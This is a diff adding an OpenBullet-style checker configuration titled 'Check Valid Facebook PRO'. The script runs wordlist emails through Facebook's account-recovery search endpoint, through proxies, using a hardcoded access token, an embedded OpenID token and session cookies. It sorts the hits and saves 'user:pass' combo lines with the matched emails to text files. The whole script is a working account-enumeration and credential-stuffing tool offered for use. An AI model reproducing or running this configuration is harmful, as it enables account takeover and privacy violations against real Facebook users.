@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "Check Valid Facebook PRO",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-12-19T16:04:43.8507677+07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "t.me/vbprom",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Check Valid Facebook PRO",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#check_valid_fb REQUEST GET "https://b-graph.facebook.com/recover_accounts?q=&friend_name=&qs={%22email%22:[%22<USER>%22]}&summary=true&device_id=9bf2f778-4e47-4223-b08a-d9a2eb299ca4&src=fb4a_login_openid_as&machine_id=_lo9YulR5OsSqYaQtHp0nknO&sfdid=2e0f71a2-9470-42bb-a906-b03182802ccf&fdid=9bf2f778-4e47-4223-b08a-d9a2eb299ca4&sim_serials=[]&sms_retriever=false&cds_experiment_group=-1&shared_phone_test_group=&allowlist_email_exp_name=&shared_phone_exp_name=&shared_phone_cp_nonce_code=&shared_phone_number=&is_auto_search=true&is_feo2_api_level_enabled=false&is_sso_like_oauth_search=false&openid_tokens=[%22eyJhbGciOiJSUzI1NiIsImtpZCI6IjU4YjQyOTY2MmRiMDc4NmYyZWZlZmUxM2MxZWIxMmEyOGRjNDQyZDAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJhY2NvdW50cy5nb29nbGUuY29tIiwiYXpwIjoiMTUwNTc4MTQzNTQtbWthcmtndGlscTdrNWJvN2Y1ODA0azFkZTAybTNzYjYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiIxNTA1NzgxNDM1NC04MGNnMDU5Y240OWo2a21oaGtqYW00YjAwb24xZ2Iybi5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNzM2NDU2NzI3OTYyMTM1MTQ1OCIsImVtYWlsIjoibmQ1MDM2NzI4QGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpYXQiOjE2NDgxODg2NzcsImV4cCI6MTY0ODE5MjI3N30.qKjIicKUdUUInHbkF5IWalAuuJps-NfhHHyrBileNjkCvHBVZbDlytwIQcVfKk5-PP1ex-HHdZ5aswjM31V3y8hnzIPM_JNNHi6c-pnWLuCJX68STfBGfsew1sxFxnOa-Uoh1pbTYzUukxupuoELZVM9UxK3EduKJOYuJfunRVJzR_Ze20O4iUgAk0Rnq5jg6srbHTyGmjOTzYtsn4SRsNC5afWF5I5MX44gYwH4lL2hmNeIY1ahFK9ce42KIBLHNvqVPHPp3fGSmTiZEmCEkTbS70xeQBx_UW4w4npsQTVgNMEjZGeFUZ49TysEDV4j8Iu0YX3K0F-8Vif4e0Wu5w%22]&encrypted_msisdn=&locale=vi_VN&client_country_code=VN&method=GET&fb_api_req_friendly_name=accountRecoverySearch&fb_api_caller_class=AccountSearchHelper&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32" 
+  
+  COOKIE "cookie: sb=PsLBYQKyyZsAAjgDvR67rLt9; m_pixel_ratio=1; datr=PsLBYQB4PFrIvTJwS7Mzq-Q4; usida=eyJ2ZXIiOjEsImlkIjoiQXJmZjR3dzM2b2R2ZCIsInRpbWUiOjE2NTg0ODcyMDB9; fr=0p1gX1WBmJhGOD2sX.AWWYGVgmArNAuK9yhCA6LDLb6O8.BiJzAn.zW.AAA.0.0.Bi2oG-.AWU3Q8inaos; wd=1920x969" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"type\": \"EMAIL\"" 
+    KEY "\"total_count\": 1," 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"total_count\": 0," 
+
+#email PARSE "<SOURCE>" JSON "display" Recursive=TRUE -> VAR "Email" 
+
+#Emails FUNCTION Replace "\\u0040" "@" "<Email>" -> VAR "Emails" 
+
+IF "<Emails>" Contains "<USER>"
+SET VAR "Mail" "Mail Ok"
+ENDIF
+IF "<Emails>" DoesNotContain "<USER>"
+SET VAR "Mail" "Mail Ẩn"
+ENDIF
+IF "<Code>" Contains "6"
+SET VAR "68" "6"
+ENDIF
+IF "<Code>" Contains "8"
+SET VAR "68" "8"
+ENDIF
+
+#FULL FUNCTION Constant "<USER>:<PASS> ==> <Emails>" -> CAP "FULL" 
+
+UTILITY Folder "Check Valid Facebook PRO" Create 
+
+UTILITY File "Check Valid Facebook PRO\\<Mail>.txt" AppendLines "<USER>:<PASS> | <Emails>" 
+
